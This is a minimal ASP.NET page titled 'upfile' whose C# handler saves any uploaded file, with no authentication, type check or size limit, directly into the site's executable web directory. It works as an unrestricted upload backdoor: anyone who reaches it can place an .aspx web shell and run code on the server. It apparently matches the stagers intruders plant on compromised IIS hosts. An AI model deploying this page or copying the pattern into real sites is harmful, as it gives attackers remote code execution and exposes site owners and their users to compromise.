<%@ Page Language="C#" %>
<html>
<head>
    <title>upfile</title>
</head>
<body>
    <form method="post" enctype="multipart/form-data" runat="server">
        <asp:FileUpload ID="FileUpload1" runat="server" />
        <asp:Button ID="UploadButton" runat="server" Text="Submit" OnClick="UploadButton_Click" />
        <br />
        <asp:Label ID="StatusLabel" runat="server" Text=""></asp:Label>
    </form>

    <script runat="server">
        protected void UploadButton_Click(object sender, EventArgs e)
        {
            if (FileUpload1.HasFile)
            {
                try
                {
                    string filename = System.IO.Path.GetFileName(FileUpload1.FileName);
                    string savePath = Server.MapPath("./") + filename;
                    FileUpload1.SaveAs(savePath);
                    StatusLabel.Text = "Done: " + filename;
                }
                catch (Exception ex)
                {
                    StatusLabel.Text = "Error: " + ex.Message;
                }
            }
            else
            {
                StatusLabel.Text = "No file selected.";
            }
        }
    </script>
</body>
</html>
